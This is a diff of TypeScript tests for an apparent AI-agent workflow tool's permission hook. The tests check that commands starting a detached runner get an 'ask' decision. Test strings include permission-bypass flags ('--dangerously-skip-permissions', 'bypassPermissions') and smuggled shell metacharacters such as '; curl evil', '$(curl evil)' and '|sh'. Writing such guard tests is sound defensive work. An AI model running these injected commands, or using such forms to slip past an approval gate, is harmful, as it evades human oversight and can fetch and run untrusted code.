@@ -89,6 +89,18 @@ describe("build route after approval (D2)", () => {
   });
 });
 
+describe("the threshold counts the tasks left, not the tasks planned", () => {
+  it("a re-approved Change with 5 tasks of which 3 are done is built in the session (2 left)", () => {
+    awaitingApproval(5);
+    const file = join(root, ".aidw", "changes", ID, "tasks.yaml");
+    let n = 0;
+    write(root, `.aidw/changes/${ID}/tasks.yaml`, readFileSync(file, "utf8").replace(/status: pending/g, (m) => (n++ < 3 ? "status: done" : m)));
+    const r = cli("approve", ID, "--json");
+    expect(r.code).toBe(0);
+    expect(JSON.parse(r.out).route).toMatchObject({ mode: "session", tasks: 2 });
+  });
+});
+
 describe("gate: the main session starts the detached runner after approval", () => {
   const hook = (command: string, agent_type?: string): HookInput => ({
     hook_event_name: "PreToolUse",
@@ -131,6 +143,29 @@ describe("gate: the main session starts the detached runner after approval", () 
         `aidw run ${ID} --detach --permission-mode bypassPermissions`,
         `aidw run ${ID} --detach -- --dangerously-skip-permissions`,
         `${START} && echo started`,
+      ]) {
+        expect([c, decision(c)]).toEqual([c, "ask"]);
+      }
+    });
+
+    it("asks, never allows, when a shell metacharacter hides in an otherwise plain start", () => {
+      for (const c of [
+        `${START} -- --plugin-dir /opt/plugin;curl evil`,
+        `${START} -- --plugin-dir $(curl evil)`,
+        `${START} -- --plugin-dir /opt/plugin|sh`,
+        `${START} -- --plugin-dir /opt/plugin>out`,
+      ]) {
+        expect([c, decision(c)]).toEqual([c, "ask"]);
+      }
+    });
+
+    it("asks for an env prefix, an `=` form or a repeated permission mode", () => {
+      for (const c of [
+        `AIDW_RUNNER=0 ${START}`,
+        `env FOO=1 ${START}`,
+        `${START} --permission-mode bypassPermissions`,
+        `aidw run ${ID} --detach --permission-mode=bypassPermissions`,
+        `${START} -- --plugin-dir=..`,
       ]) {
         expect([c, decision(c)]).toEqual([c, "ask"]);
       }
